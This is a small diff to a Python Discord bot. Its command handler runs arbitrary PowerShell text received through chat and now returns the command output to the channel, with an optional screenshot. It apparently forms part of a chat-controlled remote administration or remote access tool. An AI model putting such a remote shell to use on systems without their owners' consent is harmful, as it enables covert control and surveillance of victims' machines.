@@ -89,7 +89,9 @@ async def cmd(ctx):
 		await ctx.send("No command provided, no commands sent")
 	else:
 		await ctx.send(f"Running the command `{command}`, it may take some time to finish...")
-		run(["powershell", command], shell=True)
+		result = run(["powershell", command], shell=True, capture_output=True, text=True, check=True)
+		await ctx.send(result.stdout)
+		await ctx.send(result.stderr)
 	if(sendScreen == "True"):
 		await screen(ctx)
 
